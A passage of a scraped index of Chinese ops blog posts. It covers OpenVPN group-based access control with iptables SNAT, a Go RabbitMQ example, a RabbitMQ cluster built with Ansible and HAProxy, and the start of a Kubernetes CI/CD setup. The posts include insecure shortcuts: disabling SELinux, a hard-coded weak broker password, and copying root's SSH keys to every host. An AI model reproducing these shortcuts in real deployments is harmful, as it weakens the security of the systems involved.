穿越不安全网络的命令 $ ./easyrsa gen-dh ##时间稍长,稍等一会 $ openvpn --genkey --secret ta.key 创建服务器配置文件 如下server.conf, 使用的是tap, 可以自由定义客户端ip地址.根据IP地址来进行权限分离.\n$ cat server.conf port 11194 proto tcp-server dev tap ca /etc/openvpn/keys/ca.crt cert /etc/openvpn/keys/server.crt key /etc/openvpn/keys/server.key # This file should be kept secret dh /etc/openvpn/keys/dh.pem mode server tls-server duplicate-cn keepalive 15 120 comp-lzo max-clients 150 user openvpn group openvpn persist-key persist-tun log openvpn.log log-append openvpn.log verb 5 client-config-dir /etc/openvpn/junhsue/users server 172.30.0.0 255.255.0.0 #push \u0026#34;dhcp-option DNS 202.96.209.133\u0026#34; #push \u0026#34;dhcp-option DNS 210.22.84.3\u0026#34; #push \u0026#34;dhcp-option DNS 114.114.114.114\u0026#34; ## 抽取公共的权限push路由功能, 所有具有vpn的人都可以访问如下内网. push \u0026#34;route ip 255.255.255.255 \u0026#34; # https://athena.fenghong.tech push \u0026#34;route ip 255.255.255.255 \u0026#34; # classic jump push \u0026#34;route ip 255.255.255.255 \u0026#34; # vpc jump push \u0026#34;route ip 255.255.255.255 \u0026#34; # vpc java testing push \u0026#34;route ip 255.255.255.255 \u0026#34; # vpc k8s testing push \u0026#34;route ip 255.255.255.255 \u0026#34; # test db push \u0026#34;route ip 255.255.255.255 \u0026#34; # test drds push \u0026#34;route ip 255.255.255.255 \u0026#34; # https://code.fenghong.tech 说明\n server 172.30.0.0 255.255.0.0 命令解释：这条命令的结果相当于一系列命令的集合，server用在路由模式; 如果是tap则相当于：\nifconfig 1172.30.0.1 255.255.0.0 设置服务端的tap地址为172.30.0.1\nifconfig-pool 172.30.0.2 172.30.255.254 255.255.0.0 客户端使用的地址池\npush \u0026quot;route-gateway 172.30.0.1\u0026quot;\n 启动服务\n$ systemctl start openvpn@server 启动错误, 明明配置文件正确, 修改重载了一下,却发现启动不了.\nJob for openvpn@server.service failed because the control process exited with error code. Failed to start OpenVPN Robust And Highly Flexible Tunneling Application On serve 恢复服务, 需要修复文件. 这个比较蛋疼.\n$ fixfiles -R openvpn restore 主机配置SNAT进行权限分离\n$ tree . ├── bi ├── data ├── platform ├── product └── users └── louis 有四个组, 比如bi, data,platform,product, 每个组的内网权限不一样.\n$ cat bi push \u0026quot;route 192.168.10.0 255.255.255.0 \u0026quot; # bi-e subnet $ cat data push \u0026quot;route ip01 255.255.255.255\u0026quot; # data-vpc for data push \u0026quot;route ip02 255.255.255.255\u0026quot; # offline-testing for data push \u0026quot;route ip03 255.255.255.255\u0026quot; # risk-vpc-offline for data push \u0026quot;route ip04 255.255.255.255\u0026quot; # risk-vpc for data push \u0026quot;route ip05 255.255.255.255\u0026quot; # graphsql for data $ cat product push \u0026quot;route ip06 255.255.255.255\u0026quot; # https://hrhx-ymer-admin.fenghong.tech push \u0026quot;route ip07 255.255.255.255\u0026quot; # https://debt-admin.fenghong.tech:8443 push \u0026quot;route ip08 255.255.255.255 \u0026quot; # https://bi-report.fenghong.tech:4443 push \u0026quot;route ip09 255.255.255.255 \u0026quot; # https://marketing.fenghong.tech ... $ cat users/louis ifconfig-push 172.30.100.104 255.255.0.0 ## \u0026gt;\u0026gt;bi\u0026lt;\u0026lt; push \u0026quot;route 192.168.10.0 255.255.255.0 \u0026quot; # bi-e subnet 根据group的路由政策. 来进行原目标的SNAT, 进行了权限控制. 去掉了很多, 建议自行根据权限把控来添加MASQUERADE\n# Generated by iptables-save v1.6.0 on Sat May 26 10:12:50 2018 *filter :INPUT ACCEPT [4884159:1326612100] :FORWARD ACCEPT [3155300:2809181555] :OUTPUT ACCEPT [4731682:3822395521] :DOCKER - [0:0] :DOCKER-ISOLATION - [0:0] :DOCKER-USER - [0:0] -A INPUT -s 10.47.136.50/32 -j ACCEPT -A INPUT -s 172.16.0.0/16 -j ACCEPT -A FORWARD -j DOCKER-USER -A FORWARD -j DOCKER-ISOLATION -A FORWARD -o docker0 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT -A FORWARD -o docker0 -j DOCKER -A FORWARD -i docker0 ! -o docker0 -j ACCEPT -A FORWARD -i docker0 -o docker0 -j ACCEPT -A DOCKER-ISOLATION -j RETURN -A DOCKER-USER -j RETURN COMMIT # Completed on Sat May 26 10:12:50 2018 # Generated by iptables-save v1.6.0 on Sat May 26 10:12:50 2018 *nat :PREROUTING ACCEPT [2:128] :INPUT ACCEPT [0:0] :OUTPUT ACCEPT [1:52] :POSTROUTING ACCEPT [1:52] :DOCKER - [0:0] -A PREROUTING -m addrtype --dst-type LOCAL -j DOCKER -A OUTPUT ! -d 127.0.0.0/8 -m addrtype --dst-type LOCAL -j DOCKER -A POSTROUTING -s 172.30.10.0/24 -d 192.168.10.0/24 -p tcp -m comment --comment \u0026quot;vpc subnet for bi-e\u0026quot; -j MASQUERADE -A POSTROUTING -s 172.17.0.0/16 ! -o docker0 -j MASQUERADE -A POSTROUTING -d 172.16.30.6/32 -o tun0 -j MASQUERADE -A POSTROUTING -d 192.168.5.0/24 -o tun0 -j MASQUERADE -A POSTROUTING -d 192.168.11.221/32 -o tun0 -j MASQUERADE -A POSTROUTING -s 172.30.0.0/16 -d 60.191.0.82/32 -m comment --comment \u0026quot;ip.cn for common\u0026quot; -j MASQUERADE -A POSTROUTING -s 172.30.1.0/24 -d 47.94.79.97/32 -p tcp -m tcp --dport 80 -m comment --comment \u0026quot;http://cashbus-teldata02.fenghong.tech for spider\u0026quot; -j MASQUERADE -A POSTROUTING -s 172.30.1.0/24 -d 182.92.140.13/32 -p tcp -m tcp --dport 443 -m comment --comment \u0026quot;https://proxy-service.fenghong.tech for spider\u0026quot; -j MASQUERADE -A POSTROUTING -s 172.30.2.0/24 -d 192.168.253.39/32 -m comment --comment \u0026quot;vpc pgsql for product\u0026quot; -j MASQUERADE -A POSTROUTING -s 172.30.22.0/24 -m comment --comment \u0026quot;super administrator\u0026quot; -j MASQUERADE -A POSTROUTING -s 172.30.0.0/16 -d 60.205.232.231/32 -m comment --comment \u0026quot;vpc jump\u0026quot; -j MASQUERADE -A POSTROUTING -s 172.30.0.0/16 -d 47.94.188.150/32 -m comment --comment \u0026quot;test db for all\u0026quot; -j MASQUERADE -A POSTROUTING -s 172.30.255.0/24 -d 123.56.215.244/32 -p tcp -m tcp --dport 443 -m comment --comment \u0026quot;https://wb.fenghong.tech for thirdparty\u0026quot; -j MASQUERADE -A POSTROUTING -s 172.30.22.0/24 -m comment --comment \u0026quot;super administrator\u0026quot; -j MASQUERADE -A DOCKER -i docker0 -j RETURN COMMIT 客户端生成 客户端配置文件模板\nclient dev tap proto tcp remote 101.132.33.146 11194 resolv-retry infinite nobind persist-key persist-tun ca ca.crt cert sample.crt key sample.key remote-cert-tls server comp-lzo verb 3 生成客户端证书脚本.\n#!/usr/bin/env bash  client=$1 group=$2 if [[ x$client = x || x$group = x ]]; then echo \u0026#34;Usage: $0clientname group\u0026#34; exit 1 fi cd /etc/openvpn/easy-rsa/3/ declare -A groupNetPrefixArr // 对不同的部门进行分组 // 不同部门的权限不一样. 服务器统一管理 groupNetPrefixArr=( [\u0026#34;platform\u0026#34;]=\u0026#34;172.30.0.\u0026#34; [\u0026#34;spider\u0026#34;]=\u0026#34;172.30.1.\u0026#34; [\u0026#34;product\u0026#34;]=\u0026#34;172.30.2.\u0026#34; [\u0026#34;bi\u0026#34;]=\u0026#34;172.30.10.\u0026#34; [\u0026#34;data\u0026#34;]=\u0026#34;172.30.100.\u0026#34; ) baseDir=\u0026#34;/etc/openvpn\u0026#34; clientConfigDir=\u0026#34;$baseDir/junhsue/users\u0026#34; _netPrefix=${groupNetPrefixArr[$group]} netPrefix=${_netPrefix:? error group name!!} while true do randomNum=$(expr $RANDOM % 255) clientIp=\u0026#34;${netPrefix}${randomNum}\u0026#34; if ! grep -qrn $clientIp $clientConfigDir ;then echo \u0026#34;-- user $clientassign ip [$clientIp]\u0026#34; break fi echo \u0026#34;-- $clientIpalready in use...\u0026#34; sleep 1s done echo \u0026#34;Generating profiles...\u0026#34; cat \u0026gt; $clientConfigDir/$client \u0026lt;\u0026lt; eof ifconfig-push $clientIp 255.255.0.0 ## \u0026gt;\u0026gt;$group\u0026lt;\u0026lt; `cat $baseDir/junhsue/$group` eof echo \u0026#34;Generating done...\u0026#34; #exit if [[ ! -e keys/${client}.key ]]; then echo \u0026#34;Generating keys...\u0026#34; . vars ./easyrsa build-client-full $client nopass echo \u0026#34;...keys generated.\u0026#34; fi tarball=./keys/$client.tgz if [ ! -e $tarball ]; then echo \u0026#34;Creating tarball...\u0026#34; tmpdir=/tmp/client-tar.$$ mkdir $tmpdir cp client.ovpn $tmpdir/client.ovpn sed -i \u0026#34;s/sample/$client/g\u0026#34; $tmpdir/client.ovpn cp keys/ca.crt $tmpdir cp pki/private/$client.key $tmpdir/ cp pki/issued/$client.crt $tmpdir/ tar -C $tmpdir -czvf $tarball . rm -rf $tmpdir echo \u0026#34;...tarball created\u0026#34; else echo \u0026#34;Nothing to do, so nothing done. (keys/$client.tgz already exists)\u0026#34; fi 删除客户端证书脚本\n#!/usr/bin/env bash source vars cd /etc/openvpn/easy-rsa/3/ client=$1 ./easyrsa revoke $client ./easyrsa gen-crl find ./ -name \u0026#34;$client*\u0026#34; -exec rm -fv {} \\; 总结 至此, openvpn的访问权限控制已经完毕. 核心就是利用tap模式的ifconfig-pool来实现客户端的ip受控, 再根据客户端的ip进行分类,分组, 同组成员的权限相同,根据各组的目录权限,push各组的route值客户端主机上, 根据客户端的ip来进行SNAT,实现权限分离. 设置 一组ip, 为超级用户ip组, 拥有超级权限. 访问所有资源. 抽取vpn的公共权限, 推送至每个客户端的路由上. (最低权限.)\n参考   SNAT和MASQUERADE的区别\n  tun和tap模式的区别\n  Tun/Tap设备基本原理\n  centos7安装openvpn\n  谢谢您的观看\n","permalink":"https://www.fenghong.tech/blog/ops/openvpn-iptables/","tags":["ops","vpn","iptables","server"],"title":"openvpn实现内网权限隔离"},{"categories":["ops"],"contents":"$ 表示shell , # 表示注释, \u0026gt; 表示mysql\n什么是消息队列 消息（Message）是指在应用间传送的数据。消息可以非常简单，比如只包含文本字符串，也可以更复杂，可能包含嵌入对象。\n消息队列（Message Queue）是一种应用间的通信方式，消息发送后可以立即返回，由消息系统来确保消息的可靠传递。 消息发布者只管把消息发布到 MQ 中而不用管谁来取，消息使用者只管从 MQ 中取消息而不管是谁发布的。这样发布者和使用者都不用知道对方的存在。\n为什么需要消息队列  以常见的订单系统为例，用户点击【下单】按钮之后的业务逻辑可能包括：扣减库存、生成相应单据、发红包、发短信通知。在业务发展初期这些逻辑可能放在一起同步执行，随着业务的发展订单量增长，需要提升系统服务的性能，这时可以将一些不需要立即生效的操作拆分出来异步执行，比如发放红包、发短信通知等。 这种场景下就可以用 MQ ，在下单的主流程（比如扣减库存、生成相应单据）完成之后发送一条消息到 MQ 让主流程快速完结，而由另外的单独线程拉取MQ的消息（或者由 MQ 推送消息），当发现 MQ 中有发红包或发短信之类的消息时，执行相应的业务逻辑。\n 以上用于业务解耦的情况，其它常见场景包括最终一致性、广播、错峰流控\u0026hellip;\nRabbitMq  RabbitMQ这款消息队列中间件产品本身是基于Erlang编写，Erlang语言天生具备分布式特性（通过同步Erlang集群各节点的magic cookie来实现）。因此，RabbitMQ天然支持Clustering。\n  AMQP ：Advanced Message Queue，高级消息队列协议。它是应用层协议的一个开放标准，为面向消息的中间件设计，基于此协议的客户端与消息中间件可传递消息，并不受产品、开发语言等条件的限制。\n 消息模型\n所有 MQ 产品从模型抽象上来说都是一样的过程：\n消费者（consumer）订阅某个队列。生产者（producer）创建消息，然后发布到队列（queue）中，最后将消息发送到监听的消费者。\n Message  消息，消息是不具名的，它由消息头和消息体组成。消息体是不透明的，而消息头则由一系列的可选属性组成，这些属性包括routing-key（路由键）、priority（相对于其他消息的优先权）、delivery-mode（指出该消息可能需要持久性存储）等。\n Publisher  消息的生产者，也是一个向交换器发布消息的客户端应用程序。\n Exchange  交换器，用来接收生产者发送的消息并将这些消息路由给服务器中的队列。\n Binding  绑定，用于消息队列和交换器之间的关联。一个绑定就是基于路由键将交换器和消息队列连接起来的路由规则，所以可以将交换器理解成一个由绑定构成的路由表。\n Queue  消息队列，用来保存消息直到发送给消费者。它是消息的容器，也是消息的终点。一个消息可投入一个或多个队列。消息一直在队列里面，等待消费者连接到这个队列将其取走。\n Connection  网络连接，比如一个TCP连接。\n Channel  信道，多路复用连接中的一条独立的双向数据流通道。信道是建立在真实的TCP连接内地虚拟连接，AMQP 命令都是通过信道发出去的，不管是发布消息、订阅队列还是接收消息，这些动作都是通过信道完成。因为对于操作系统来说建立和销毁 TCP 都是非常昂贵的开销，所以引入了信道的概念，以复用一条 TCP 连接。\n Consumer  消息的消费者，表示一个从消息队列中取得消息的客户端应用程序。\n Virtual Host  虚拟主机，表示一批交换器、消息队列和相关对象。虚拟主机是共享相同的身份认证和加密环境的独立服务器域。每个 vhost 本质上就是一个 mini 版的 RabbitMQ 服务器，拥有自己的队列、交换器、绑定和权限机制。vhost 是 AMQP 概念的基础，必须在连接时指定，RabbitMQ 默认的 vhost 是 / 。\n Broker  表示消息队列服务器实体。\nExchange类型\n目前是有四种类型, 分别为direct, fanout, topic, header.\n direct  消息中的路由键（routing key）如果和 Binding 中的 binding key 一致， 交换器就将消息发到对应的队列中。 路由键与队列名完全匹配，如果一个队列绑定到交换机要求路由键为\u0026quot;test\u0026rdquo;，则只转发 routing key 标记为\u0026quot;dog\u0026quot;的消息，不会转发\u0026quot;test.puppy\u0026rdquo;，也不会转发\u0026quot;test.guard\u0026quot;等等。它是完全匹配、单播的模式。\ngolang实例 项目结构\nrabbitmq]# tree . ├── go.mod ├── go.sum ├── main.go ├── receive │ └── receiev.go └── send └── send.go send.go 作为消息的产生者, 采用的是routing key 和 queue名称相同.\npackage send import ( \u0026#34;fmt\u0026#34; \u0026#34;github.com/streadway/amqp\u0026#34; //根据实际情况来定 \t\u0026#34;log\u0026#34; \u0026#34;strconv\u0026#34; \u0026#34;time\u0026#34; ) //创建一个返回错误打印日志的函数 func FailOnError(err error, msg string) { if err != nil { log.Fatalf(\u0026#34;%s: %s\u0026#34;, msg, err) } } func Send() { //打开一个连接 \tconn, err := amqp.Dial(\u0026#34;amqp://rabbit:123456@192.168.133.128:5672\u0026#34;) FailOnError(err, \u0026#34;failed to connect to RabbitMQ\u0026#34;) defer conn.Close() //打开一个通道 \tch, err := conn.Channel() FailOnError(err, \u0026#34;failed to open a channel\u0026#34;) defer ch.Close() q, err := ch.QueueDeclare( \u0026#34;test rabbitMq number\u0026#34;, // name \tfalse, // durable \tfalse, // delete when usused \tfalse, // exclusive \tfalse, // no-wait \tnil, // arguments \t) FailOnError(err, \u0026#34;Failed to declare a queue\u0026#34;) fmt.Println(\u0026#34;start send message !\u0026#34;) for i := 0; i \u0026lt; 60; i++ { body := \u0026#34;hello, rabbitMq \u0026#34; + strconv.Itoa(i) err = ch.Publish( \u0026#34;\u0026#34;, q.Name, // routing key 和 queue name 相同, 路由键与队列名完全匹配,完成转发 \tfalse, false, amqp.Publishing{ ContentType: \u0026#34;text/plain\u0026#34;, Body: []byte(body), }) FailOnError(err, \u0026#34;Failed to publish a message\u0026#34;) time.Sleep(1 * time.Millisecond) } } receive.go 作为消息的消费者, 实时消费队列中的消息; 一直阻塞在等待消息队列\npackage receive import ( \u0026#34;github.com/streadway/amqp\u0026#34; \u0026#34;gogs.wangke.co/go/rabbitmq/send\u0026#34; \u0026#34;log\u0026#34; \u0026#34;time\u0026#34; ) //创建一个返回错误打印日志的函数  func Receive() { conn, err := amqp.Dial(\u0026#34;amqp://rabbit:123456@192.168.133.128:5672\u0026#34;) send.FailOnError(err, \u0026#34;Failed to connect to RabbitMQ\u0026#34;) defer conn.Close() ch, err := conn.Channel() send.FailOnError(err, \u0026#34;Failed to open a channel\u0026#34;) defer ch.Close() q, err := ch.QueueDeclare( \u0026#34;test rabbitMq number\u0026#34;, // name \tfalse, // durable \tfalse, // delete when usused \tfalse, // exclusive \tfalse, // no-wait \tnil, // arguments \t) send.FailOnError(err, \u0026#34;Failed to declare a queue\u0026#34;) msgs, err := ch.Consume( q.Name, // queue \t\u0026#34;\u0026#34;, // consumer \ttrue, // auto-ack \tfalse, // exclusive \tfalse, // no-local \tfalse, // no-wait \tnil, // args \t) send.FailOnError(err, \u0026#34;Failed to register a consumer\u0026#34;) forever := make(chan bool) for i := 0; i \u0026lt; 60; i++ { go func() { for d := range msgs { log.Printf(\u0026#34;Received a message: %s\u0026#34;, d.Body) } }() time.Sleep(30 * time.Millisecond) } log.Printf(\u0026#34;Waiting for messages. To exit press CTRL+C\u0026#34;) \u0026lt;-forever } 主程序main.go, 先产生消息, 然后消费消息.\npackage main import ( \u0026#34;gogs.wangke.co/go/rabbitmq/receive\u0026#34; \u0026#34;gogs.wangke.co/go/rabbitmq/send\u0026#34; ) func main() { send.Send() receive.Receive() } modules\nmodule gogs.wangke.co/go/rabbitmq go 1.13 require github.com/streadway/amqp v0.0.0-20190827072141-edfb9018d271 编译并运行\n## 允许go modules $ go env -w GO111MODULE=on $ go env -w GOPROXY=\u0026#34;https://goproxy.cn,direct\u0026#34; ## git clone 项目并运行. $ git clone http://gogs.wangke.co/go/rabbitmq.git $ cd rabbitmq \u0026amp;\u0026amp; go run main.go start send message ! 2019/11/07 01:09:48 Received a message: hello, rabbitMq 0 2019/11/07 01:09:48 Received a message: hello, rabbitMq 1 2019/11/07 01:09:48 Received a message: hello, rabbitMq 2 2019/11/07 01:09:48 Received a message: hello, rabbitMq 3 2019/11/07 01:09:48 Received a message: hello, rabbitMq 4 2019/11/07 01:09:48 Received a message: hello, rabbitMq 5 2019/11/07 01:09:48 Received a message: hello, rabbitMq 6 2019/11/07 01:09:48 Received a message: hello, rabbitMq 7 2019/11/07 01:09:48 Received a message: hello, rabbitMq 8 2019/11/07 01:09:48 Received a message: hello, rabbitMq 9 2019/11/07 01:09:50 [*] Waiting for messages. To exit press CTRL+C 登陆本地的rabbitmq web客户端, 查看queue相关信息.\n","permalink":"https://www.fenghong.tech/blog/go/rabbitmq-queue-use/","tags":["queue","rabbitmq","cluster","haproxy","go"],"title":"RabbitMq消息队列使用"},{"categories":["ops"],"contents":" RabbitMQ这款消息队列中间件产品本身是基于Erlang编写，Erlang语言天生具备分布式特性（通过同步Erlang集群各节点的magic cookie来实现）。因此，RabbitMQ天然支持Clustering。\n RabbitMq依赖环境及安装一览, $ 表示shell , # 表示注释, \u0026gt; 表示mysql\n$ rabbitmqctl --version 3.8.1 $ erl --version Erlang/OTP 22 $ java -version java version \u0026#34;1.8.0_111\u0026#34; Java(TM) SE Runtime Environment (build 1.8.0_111-b14) Java HotSpot(TM) 64-Bit Server VM (build 25.111-b14, mixed mode) 初始化环境 分别修改主机名\n$ hostnamectl set-hostname c1 ## c1 作为当前主机名. 如果 DNS 不支持解析主机名称，则需要修改每台机器的 /etc/hosts 文件\n$ cat \u0026gt;\u0026gt; /etc/hosts \u0026lt;\u0026lt;EOF 192.168.133.133 c4 192.168.133.128\tc1 192.168.133.129 c2 192.168.133.130 c3 EOF 解除linux系统最大进程数和最大文件打开数\n$ cat \u0026gt;\u0026gt; /etc/security/limits.conf \u0026lt;\u0026lt; EOF * soft noproc 65535 * hard noproc 65535 * soft nofile 65535 * hard nofile 65535 EOF $ cat \u0026gt;\u0026gt; /etc/profile.d/limits.sh \u0026lt;\u0026lt;EOF ulimit -u 65535 ## max user processes ulimit -n 65535 ## open files ulimit -d unlimited ## data seg size ulimit -m unlimited ## max memory size ulimit -s unlimited ## stack size ulimit -t unlimited ## cpu time ulimit -v unlimited ## virtual memory EOF $ source /etc/profile.d/limits.sh 习惯性做完互信工作, 习惯性禁用防火墙(生产环境自行使用iptables). c1主机为ansible管理主机,详细查询ansible的这篇文章\n$ ssh-keygen $ ssh-copy-id localhost $ for i in c1 c2 c3 c4 ;do scp -r /root/.ssh $i:/root/.ssh ;done 关闭 SELinux\nsetenforce 0 sed -i 's/^SELINUX=.*/SELINUX=disabled/' /etc/selinux/config 防火墙配置 (选择做, 楼主实验用的策略是iptables -F, 生产环境建议如下)\n$ firewall-cmd --permanent --add-port=25672/tcp $ firewall-cmd --permanent --add-port=15672/tcp $ firewall-cmd --permanent --add-port=5672/tcp $ firewall-cmd --permanent --add-port=4369/tcp $ systemctl restart firewalld.service 基于ansible安装 在c1主机上, 下载相关的tar文件\n$ cd /data/ $ wget http://erlang.org/download/otp_src_22.1.tar.gz $ wget https://dl.bintray.com/rabbitmq/all/rabbitmq-server/3.8.1/rabbitmq-server-generic-unix-3.8.1.tar.xz palybook安装erlang及RabbitMq\n--- - hosts: all remote_user: root tasks: - name: mkdir file: path: /data state: directory mode: \u0026#39;0755\u0026#39; - name: cp copy: src: /data/rabbitmq-server-generic-unix-3.8.1.tar.xz dest: /data/rabbitmq-server-generic-unix-3.8.1.tar.xz - name: tar xf shell: \u0026#34;cd /data \u0026amp;\u0026amp; tar xf rabbitmq-server-generic-unix-3.8.1.tar.xz -C /usr/local/\u0026#34; - name: mkdir file: path: /data state: directory mode: \u0026#39;0755\u0026#39; - name: cp copy: src: /data/otp_src_22.1.tar.gz dest: /data/otp_src_22.1.tar.gz - name: tar xf make install shell: \u0026#34;cd /data \u0026amp;\u0026amp; tar xf otp_src_22.1.tar.gz \u0026amp;\u0026amp; cd otp_src_22.1 \u0026amp;\u0026amp; ./configure --prefix=/usr/local/bin/erlang --without-javac \u0026amp;\u0026amp; make \u0026amp;\u0026amp; make install\u0026#34; 不重启系统,生效环境变量\n执行以下命令, 若返回Eshell,说明安装成功\n$ ansible all -m shell -a \u0026quot;echo export PATH=$PATH:/usr/local/bin/erlang/bin:/usr/local/rabbitmq_server-3.8.1/sbin \u0026gt;\u0026gt; /etc/profile\u0026quot; $ ansible all -m shell -a \u0026quot;source /etc/profile \u0026amp;\u0026amp; erl --version \u0026quot; 192.168.133.133 | SUCCESS | rc=0 \u0026gt;\u0026gt; Eshell V10.5 (abort with ^G) 1\u0026gt; *** Terminating erlang (nonode@nohost) 192.168.133.130 | SUCCESS | rc=0 \u0026gt;\u0026gt; Eshell V10.5 (abort with ^G) 1\u0026gt; *** Terminating erlang (nonode@nohost) 192.168.133.129 | SUCCESS | rc=0 \u0026gt;\u0026gt; Eshell V10.5 (abort with ^G) 1\u0026gt; *** Terminating erlang (nonode@nohost) 192.168.133.128 | SUCCESS | rc=0 \u0026gt;\u0026gt; Eshell V10.5 (abort with ^G) 1\u0026gt; *** Terminating erlang (nonode@nohost) 启动RabbitMq 各节点启动rabbitmq, 出现以下状态, 说明启动成功.\n编辑每台RabbitMQ的cookie文件，以确保各个节点的cookie文件使用的是同一个值,可以scp其中一台机器上的cookie至其他各个节点，cookie的默认路径为/var/lib/rabbitmq/.erlang.cookie或者$HOME/.erlang.cookie，节点之间通过cookie确定相互是否可通信.\n$ rabbitmq-server -deched ## ## RabbitMQ 3.8.1 ## ## ########## Copyright (c) 2007-2019 Pivotal Software, Inc. ###### ## ########## Licensed under the MPL 1.1. Website: https://rabbitmq.com Starting broker... completed with 0 plugins. (可以Ctrl+C的, 已经后台运行了.) $ for i in c1 c2 c3 c4 ;do scp /root/.erlang.cookie $i:/root/ ;done 查看节点情况\n$ rabbitmqctl status -n rabbit@c1 $ rabbitmqctl status -n rabbit@c2 $ rabbitmqctl status -n rabbit@c3 $ rabbitmqctl status -n rabbit@c4 在RabbitMQ集群中的节点只有两种类型：内存节点/磁盘节点，单节点系统只运行磁盘类型的节点。而在集群中，可以选择配置部分节点为内存节点。 内存节点将所有的队列，交换器，绑定关系，用户，权限，和vhost的元数据信息保存在内存中。而磁盘节点将这些信息保存在磁盘中，但是内存节点的性能更高，为了保证集群的高可用性，必须保证集群中有两个以上的磁盘节点，来保证当有一个磁盘节点崩溃了，集群还能对外提供访问服务.\n以c1为主节点, 在c1上执行,若以内存节点加入, 则在join_cluster的时候加上--ram\n$ rabbitmqctl stop_app $ rabbitmqctl reset $ rabbitmqctl join_cluster rabbit@c2 ## 此时是以磁盘节点加入的 $ rabbitmqctl start_app #加入时候设置节点为内存节点（默认加入的为磁盘节点） $ rabbitmqctl join_cluster rabbit@c1 --ram 查看rabbitMq集群状态 $ rabbitmqctl cluster_status Cluster name: rabbit@c1 Disk Nodes rabbit@c3 rabbit@c4 RAM Nodes rabbit@c1 rabbit@c2 Running Nodes rabbit@c1 rabbit@c2 rabbit@c3 rabbit@c4 ... rabbitMq插件安装 ## list $ rabbitmq-plugins list -v ## list plugins whose name contains \u0026#34;management\u0026#34; $ rabbitmq-plugins list -v management ## install $ rabbitmq-plugins enable rabbitmq_management 到这里, rabbitMq基本已经部署完毕.\n使用haproxy负载均衡RabbitMq 对于消息的生产和消费者可以通过HAProxy的软负载将请求分发至RabbitMQ集群中的Node1～Node2节点，其中Node3～Node4的两个节点作为磁盘节点保存集群元数据和配置信息 .\n安装HaProxy\n$ yum install haproxy $ vi ha.cfg global #日志输出配置，所有日志都记录在本机，通过local0输出 log 127.0.0.1 local0 info #最大连接数 maxconn 4096 #改变当前的工作目录 chroot /apps/svr/haproxy #以指定的UID运行haproxy进程 uid 99 #以指定的GID运行haproxy进程 gid 99 #以守护进程方式运行haproxy #debug #quiet daemon #debug #当前进程pid文件 pidfile /apps/svr/haproxy/haproxy.pid #默认配置 defaults #应用全局的日志配置 log global #默认的模式mode{tcp|http|health} #tcp是4层，http是7层，health只返回OK mode tcp #日志类别tcplog option tcplog #不记录健康检查日志信息 option dontlognull #3次失败则认为服务不可用 retries 3 #每个进程可用的最大连接数 maxconn 2000 #连接超时 timeout connect 5s #客户端超时 timeout client 120s #服务端超时 timeout server 120s #绑定配置 listen rabbitmq_cluster bind 0.0.0.0:5671 #配置TCP模式 mode tcp #加权轮询 balance roundrobin #RabbitMQ集群节点配置,其中ip1~ip2为RabbitMQ集群节点ip地址 server rmq_node1 c1:5672 check inter 5000 rise 2 fall 3 weight 1 server rmq_node2 c2:5672 check inter 5000 rise 2 fall 3 weight 1 #haproxy监控页面地址 listen monitor bind 0.0.0.0:8100 mode http option httplog stats enable stats uri /stats stats refresh 5s 执行启动命令\n$ haproxy -f ha.cfg 访问http://ip:8100/stats, 即可查看haproxy状态\n","permalink":"https://www.fenghong.tech/blog/ops/rabbitmq-cluster-install/","tags":["ansible","rabbitmq","cluster","haproxy"],"title":"RabbitMq高可用集群搭建"},{"categories":["kubernetes"],"contents":"基于uk8s部署CI/CD uk8s的集群创建  创建uk8s集群.参考创建集群\n  获取内网凭证. 创建集群大概5分钟左右, 然后去集群页面获取凭证\n  管理主机为同VPC下的一台Uhost.\n 首先创建凭证,安装kubectl进行管理集群.\n$ mkdir .kube $ vim .kube/config ## 将上面获取的内网凭证复制即可 $ curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.16.0/bin/linux/amd64/kubectl $ chmod +x kubectl \u0026amp;\u0026amp; mv kubectl /usr/bin $ kubectl get nodes NAME STATUS ROLES AGE VERSION 10.23.140.24 Ready k8s-node 8h v1.15.5 10.23.162.135 Ready k8s-node 8h v1.15.5 10.23.89.169 Ready k8s-node 8h v1.15.5 基本的服务构建 项目docker化 项目docker化, 以golang项目作为例子.写一个http server, 如hello-ucloud.go,\npackage main import ( \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;os\u0026#34; ) func main() { http.HandleFunc(\u0026#34;/\u0026#34;, func(w http.ResponseWriter, r *http.Request) { log.Printf(\u0026#34;%s %s %s %s\u0026#34;, r.Method, r.URL, r.Host, r.RemoteAddr) version := os.Getenv(\u0026#34;VERSION\u0026#34;) if version == \u0026#34;\u0026#34; { version = \u0026#34;v1\u0026#34; // version = \u0026#34;v2\u0026#34; 模拟发布. v3 v4 v5 v6 \t} fmt.Fprintf(w, \u0026#34;hello UCloud! version: %s\\n\u0026#34;, version) }) log.Fatal(http.ListenAndServe(\u0026#34;:8000\u0026#34;, nil)) } 编写dockerfile, 主要是编译go项目, 然后把生成的二进制拷贝到Alpine运行, 依赖最小, 生成的镜像也很小, 只有30M左右\nFROM uhub.service.ucloud.cn/hahahahaha/golang:1.12.7 AS builder ENV GO111MODULE=on ENV GOPROXY=https://goproxy.io WORKDIR /root COPY hello-ucloud.go . RUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o /deploy hello-ucloud.go FROM alpine:3.7 RUN apk add tzdata ca-certificates \u0026amp;\u0026amp; cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \\ \u0026amp;\u0026amp; echo \u0026quot;Asia/Shanghai\u0026quot; \u0026gt; /etc/timezone \\ \u0026amp;\u0026amp; apk del tzdata \u0026amp;\u0026amp; rm -rf /var/cache/apk/* COPY --from=builder /deploy /bin/deploy ENTRYPOINT [\u0026quot;/bin/deploy\u0026quot;] 编写yaml文件进行部署至k8s, 一个deployment和一个service, 暴露方式为LoadBalancer+ClusterIp\napiVersion: apps/v1 kind: Deployment metadata: name: hello-world-deployment labels: app: hello-world env: testing release: hello-go ## 这个与jenkins的job名字相同.用来筛选 spec: replicas: 2 selector: matchLabels: app: hello-world template: metadata: labels: app: hello-world spec: containers: - name: helloworldc ports: - containerPort: 8000 protocol: TCP --- apiVersion: v1 kind: Service metadata: labels: app: hello-world name: hello-world-deployment spec: ports: - port: 8080 protocol: TCP targetPort: 8000 selector: app: hello-world type: LoadBalancer ##会生成10M宽带的EIP gogs搭建仓库 #!/bin/bash data=`pwd` docker run -d \\  --hostname gogs.wangke.co \\  --name=gogs -p 22:22 -p 80:3000 \\  -v ${data}/data:/data \\  gogs/gogs 